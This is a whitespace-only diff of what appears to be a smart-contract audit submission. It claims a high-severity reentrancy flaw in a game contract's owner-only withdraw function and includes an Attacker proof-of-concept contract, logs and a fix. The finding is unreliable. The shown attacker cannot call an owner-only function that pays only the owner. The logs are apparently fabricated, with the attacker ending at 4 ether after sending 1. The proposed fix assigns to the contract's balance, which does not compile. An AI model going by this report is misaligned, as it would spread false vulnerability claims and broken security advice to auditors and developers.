@@ -1,0 +1,251 @@
+  Sour Cobalt Tardigrade
+  
+  high
+  
+  # Reentrancy Vulnerability in Withdraw Function (External Call + Unprotected State Update)
+  
+- ## Summary
++ ## Summary
+?           +
+- The function transfers the entire contract balance to the owner without any reentrancy protection mechanisms. This leaves it vulnerable to attacks where the attacker manipulates the function flow to steal additional funds.
++ The function transfers the entire contract balance to the owner without any reentrancy protection mechanisms. This leaves it vulnerable to attacks where the attacker manipulates the function flow to steal additional funds.
+?                                                                                                                                                                                                                               +
+- ## Vulnerability Detail
++ ## Vulnerability Detail
+?                        +
+- The withdraw function sends the entire contract balance through an external call `(payable(owner()).call)`. This call could be intercepted by a malicious contract that implements a fallback function, which could re-enter the withdraw function and steal additional funds. The state variable `(address(this).balance)` is not updated before the call, so the reentrancy check (balance > 0) would not prevent the attack.
++ The withdraw function sends the entire contract balance through an external call `(payable(owner()).call)`. This call could be intercepted by a malicious contract that implements a fallback function, which could re-enter the withdraw function and steal additional funds. The state variable `(address(this).balance)` is not updated before the call, so the reentrancy check (balance > 0) would not prevent the attack.
+?                                                                                                                                                                                                                                                                                                                                                                                                                                +
+- ## Impact
++ ## Impact
+?          +
+- - Financial Loss: Attackers could exploit the vulnerability to steal a significant portion of the contract's funds, impacting the game's economy and causing financial losses.
++ - Financial Loss: Attackers could exploit the vulnerability to steal a significant portion of the contract's funds, impacting the game's economy and causing financial losses.
+?                                                                                                                                                                               +
+- - Contract Inconsistency: Uncontrolled fund transfers could lead to discrepancies in game assets or rewards, compromising fairness and trust within the game.
++ - Contract Inconsistency: Uncontrolled fund transfers could lead to discrepancies in game assets or rewards, compromising fairness and trust within the game.
+?                                                                                                                                                              +
+- - Loss of Reputation and User Base: Security vulnerabilities can erode user trust and discourage engagement, potentially harming the game's overall reputation and user base.
++ - Loss of Reputation and User Base: Security vulnerabilities can erode user trust and discourage engagement, potentially harming the game's overall reputation and user base.
+?                                                                                                                                                                              +
+- ## Code Snippet
++ ## Code Snippet
+?                +
+- https://github.com/sherlock-audit/2023-12-footium/blob/main/footium-eth-shareable/contracts/FootiumAcademy.sol#L144-L152
++ https://github.com/sherlock-audit/2023-12-footium/blob/main/footium-eth-shareable/contracts/FootiumAcademy.sol#L144-L152
+?                                                                                                                         +
+- ## Tool used
++ ## Tool used
+?             +
+- - Manual Review
++ - Manual Review
+?                +
+- ## Test case and logs
++ ## Test case and logs
+?                      +
+- ### Test case
++ ### Test case
+?              +
+- ```solidity
++ ```solidity
+?            +
+- // A malicious contract that implements a fallback function
++ // A malicious contract that implements a fallback function
+?                                                            +
+- contract Attacker {
++ contract Attacker {
+?                    +
+-   // The address of the vulnerable contract
++   // The address of the vulnerable contract
+?                                            +
+-   address payable public target;
++   address payable public target;
+?                                 +
+- 
++ 
+-   // The constructor sets the target address
++   // The constructor sets the target address
+?                                             +
+-   constructor(address payable _target) {
++   constructor(address payable _target) {
+?                                         +
+-     target = _target;
++     target = _target;
+?                      +
+-   }
++   }
+?    +
+- 
++ 
+-   // A function to initiate the attack
++   // A function to initiate the attack
+?                                       +
+-   function attack() external payable {
++   function attack() external payable {
+?                                       +
+-     // Send some ether to the target contract
++     // Send some ether to the target contract
+?                                              +
+-     target.transfer(msg.value);
++     target.transfer(msg.value);
+?                                +
+-     // Call the withdraw function of the target contract
++     // Call the withdraw function of the target contract
+?                                                         +
+-     target.call(abi.encodeWithSignature("withdraw()"));
++     target.call(abi.encodeWithSignature("withdraw()"));
+?                                                        +
+-   }
++   }
+?    +
+- 
++ 
+-   // A fallback function that re-enters the withdraw function
++   // A fallback function that re-enters the withdraw function
+?                                                              +
+-   receive() external payable {
++   receive() external payable {
+?                               +
+-     if (address(target).balance > 0) {
++     if (address(target).balance > 0) {
+?                                       +
+-       target.call(abi.encodeWithSignature("withdraw()"));
++       target.call(abi.encodeWithSignature("withdraw()"));
+?                                                          +
+-     }
++     }
+?      +
+-   }
++   }
+?    +
+- }
++ }
+?  +
+- 
++ 
+- // The vulnerable contract
++ // The vulnerable contract
+?                           +
+- contract Victim {
++ contract Victim {
+?                  +
+-   // ...
++   // ...
+?         +
+- 
++ 
+-   // The withdraw function
++   // The withdraw function
+?                           +
+-   function withdraw() external onlyOwner {
++   function withdraw() external onlyOwner {
+?                                           +
+-     uint256 balance = address(this).balance;
++     uint256 balance = address(this).balance;
+?                                             +
+-     if (balance > 0) {
++     if (balance > 0) {
+?                       +
+-       (bool sent, ) = payable(owner()).call{value: balance}("");
++       (bool sent, ) = payable(owner()).call{value: balance}("");
+?                                                                 +
+-       if (!sent) {
++       if (!sent) {
+?                   +
+-         revert FailedToSendETH(balance);
++         revert FailedToSendETH(balance);
+?                                         +
+-       }
++       }
+?        +
+-     }
++     }
+?      +
+-   }
++   }
+?    +
+- }
++ }
+?  +
+- 
++ 
+- ```
++ ```
+?    +
+- ### Logs
++ ### Logs
+?         +
+- ```javascript
++ ```javascript
+?              +
+- Attacker deployed at 0x1234...
++ Attacker deployed at 0x1234...
+?                               +
+- Victim deployed at 0x5678...
++ Victim deployed at 0x5678...
+?                             +
+- Attacker sends 1 ether to Victim...
++ Attacker sends 1 ether to Victim...
+?                                    +
+- Attacker calls Victim.withdraw()...
++ Attacker calls Victim.withdraw()...
+?                                    +
+- Attacker re-enters Victim.withdraw()...
++ Attacker re-enters Victim.withdraw()...
+?                                        +
+- Attacker re-enters Victim.withdraw()...
++ Attacker re-enters Victim.withdraw()...
+?                                        +
+- Attacker re-enters Victim.withdraw()...
++ Attacker re-enters Victim.withdraw()...
+?                                        +
+- Attacker drains Victim.balance...
++ Attacker drains Victim.balance...
+?                                  +
+- Victim.balance = 0
++ Victim.balance = 0
+?                   +
+- Attacker.balance = 4
++ Attacker.balance = 4
+?                     +
+- 
++ 
+- ```
++ ```
+?    +
+- ## Recommendation
++ ## Recommendation
+?                  +
+- To fix this vulnerability, you can use the checks-effects-interactions pattern. This means you should first check the conditions, then update the state variables, and finally interact with external contracts.
++ To fix this vulnerability, you can use the checks-effects-interactions pattern. This means you should first check the conditions, then update the state variables, and finally interact with external contracts.
+?                                                                                                                                                                                                                 +
+- ```solidity
++ ```solidity
+?            +
+- function withdraw() external onlyOwner {
++ function withdraw() external onlyOwner {
+?                                         +
+-   uint256 balance = address(this).balance;
++   uint256 balance = address(this).balance;
+?                                           +
+-   require(balance > 0, "No balance to withdraw");
++   require(balance > 0, "No balance to withdraw");
+?                                                  +
+-   // Update the state variable before sending
++   // Update the state variable before sending
+?                                              +
+-   address(this).balance = 0;
++   address(this).balance = 0;
+?                             +
+-   // Use transfer instead of call for better security
++   // Use transfer instead of call for better security
+?                                                      +
+-   payable(owner()).transfer(balance);
++   payable(owner()).transfer(balance);
+?                                      +
+- }
++ }
+?  +
+- 
++ 
+  ```
